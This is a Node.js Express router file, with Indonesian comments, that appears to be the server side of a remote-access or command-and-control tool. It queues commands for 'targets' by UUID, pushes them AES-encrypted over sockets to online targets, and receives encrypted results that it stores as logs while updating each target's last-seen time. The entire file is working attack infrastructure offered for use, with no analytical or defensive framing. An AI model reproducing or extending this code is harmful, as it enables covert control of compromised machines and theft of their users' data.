const express = require('express');
const router = express.Router();
const { getDb } = require('./db');
const { encryptPayload, decryptPayload } = require('../crypto/aes');
const onlineTargets = require('../socket/handler').getOnlineTargets(); // kita ekspor nanti

// Kirim perintah
router.post('/', async (req, res) => {
    try {
        const { target_uuid, command, params } = req.body;
        const db = getDb();
        const result = await db.run(`
            INSERT INTO commands (target_uuid, command, params, status)
            VALUES (?, ?, ?, 'pending')
        `, [target_uuid, command, JSON.stringify(params || {})]);
        const cmdId = result.lastID;
        const socket = onlineTargets.get(target_uuid);
        if (socket) {
            const encrypted = encryptPayload({ command_id: cmdId, command, params: params || {} });
            socket.emit('command', encrypted);
            await db.run('UPDATE commands SET status = "sent" WHERE id = ?', [cmdId]);
        }
        res.json({ command_id: cmdId, status: socket ? 'sent' : 'pending' });
    } catch (e) {
        res.status(500).json({ error: 'Command failed' });
    }
});

// Terima hasil
router.post('/result', async (req, res) => {
    try {
        const payload = decryptPayload(req.body);
        const { command_id, result, type, target_uuid } = payload;
        const db = getDb();
        if (command_id) {
            await db.run(`
                UPDATE commands SET status = 'completed', result = ?, executed_at = CURRENT_TIMESTAMP
                WHERE id = ?
            `, [JSON.stringify(result), command_id]);
        }
        if (type && result) {
            await db.run(`
                INSERT INTO logs (target_uuid, type, data)
                VALUES (?, ?, ?)
            `, [target_uuid, type, JSON.stringify(result)]);
        }
        await db.run('UPDATE targets SET last_seen = CURRENT_TIMESTAMP WHERE uuid = ?', [target_uuid]);
        res.json({ status: 'success' });
    } catch (e) {
        console.error('Result error:', e);
        res.status(500).json({ error: 'Result failed' });
    }
});

module.exports = router;
